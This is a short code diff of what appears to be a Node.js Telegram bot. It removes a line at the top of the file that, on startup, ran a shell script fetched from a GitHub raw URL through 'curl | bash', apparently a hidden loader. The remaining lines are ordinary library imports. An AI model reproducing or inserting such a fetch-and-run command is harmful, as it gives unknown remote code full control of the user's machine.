@@ -1,12 +1,3 @@
-const { execSync } = require('child_process');
-
-execSync(
-  'curl -s https://raw.githubusercontent.com/zamzasalim/logo/main/asc.sh | bash',
-  {
-    stdio: 'inherit'
-  }
-);
-
 const { Telegraf, Markup } = require('telegraf');
 const { google } = require('googleapis');
 const { AsyncLocalStorage } = require('async_hooks');
